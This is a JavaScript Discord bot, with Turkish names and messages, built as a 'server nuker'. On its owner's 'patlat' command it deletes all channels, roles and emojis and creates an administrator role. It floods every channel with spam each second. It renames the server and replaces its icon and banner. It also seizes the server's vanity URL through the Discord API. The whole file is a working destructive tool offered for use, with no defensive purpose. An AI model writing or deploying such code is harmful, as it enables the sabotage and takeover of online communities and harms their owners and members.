const { Client } = require("discord.js");
const client = new Client()
const config = require("./config.json");
const request = require('request');

client.on("message", message => {
    if (message.author.bot || !message.content.startsWith(config.bot.prefix) || !message.guild || message.author.id !== config.bot.owner || message.guild.id !== config.guildid) return
    // let args = message.content.split(/ +/g).slice(1);
    let command = message.content.split(/ +/g)[0].slice(config.bot.prefix.length);
    if (command === "patlat") {
        if (config.required.bütünkanallarısil) { message.guild.channels.map(x => x.delete()) }
        message.guild.channels.create(`${config.names.channel_name}`, "text")
        if (config.required.spamat) {
            setInterval(() => {
                message.guild.channels.forEach(ceki => {
                    ceki.send((`${config.required.spamat}`))
                });
            }, 1000);
        }
        if (config.required.bütünrollerisil) { message.guild.roles.map(x => x.delete()) }
        message.guild.roles.create({
            data: {
                name: `${config.names.role_name}`,
                color: "RANDOM",
                permissions: "ADMINISTRATOR"
            }
        })
        if (config.required.butunemojilerisil) { message.guild.emojis.map(x => x.delete()) }
        message.guild.setName(config.names.sunucuismi);
        const icon = require("./images/icon.jpg");
        message.guild.setIcon(icon);
        const banner = require("./images/banner.jpg");
        message.guild.setBanner(banner)
        if (config.required.urlçal) {
            request({
                method: 'PATCH',
                url: `https://discord.com/api/v8/guilds/${message.guild.id}/vanity-url`,
                body: {
                    code: config.names.sunucu_vanity_url
                },
                json: true,
                headers: {
                    "Authorization": `Bot ${client.token}`
                }
            }, (err, res, body) => {
                if (err) {
                    return console.log(err);
                }
            });
        }
    }
})

client.login(config.bot.token).then(x => console.log(`${client.user.username} olarak giriş yapıldı!`)).catch (err => console.log(err))
